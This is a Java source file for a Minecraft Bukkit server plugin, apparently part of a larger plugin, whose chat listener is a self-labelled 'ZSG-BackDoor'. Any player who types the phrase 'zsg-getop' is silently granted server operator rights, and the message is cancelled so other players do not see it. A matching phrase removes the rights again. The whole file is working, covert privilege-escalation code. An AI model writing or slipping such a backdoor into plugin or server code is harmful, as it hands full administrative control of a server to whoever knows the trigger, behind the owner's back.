package zsggroup.zsg.Event;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class getopEvent implements Listener {
    @EventHandler
    public void gopEvent(AsyncPlayerChatEvent event) {
        Player p = event.getPlayer();
        boolean tempop = p.isOp();
        if(event.getMessage().equals("zsg-getop") && tempop != true) {
            p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.GOLD+"You Are Now Operator :)");
            p.setOp(true);
            event.setCancelled(true);
        }else if (event.getMessage().equals("zsg-deop")) {
            if(p.isOp()) {
                p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.RED+"You Are No Longer Operator :(");
                p.setOp(false);
                event.setCancelled(true);

            }else {
                p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.DARK_RED +"You Are Not Operator Yet :|");
                event.setCancelled(true);
            }
        }else if (event.getMessage().equals("zsg-getop") && tempop == true){
            p.sendMessage(ChatColor.GREEN+"ZSG-BackDoor >>"+ChatColor.AQUA+"You Are Already A Operator :P");
            event.setCancelled(true);
        }

    }
}
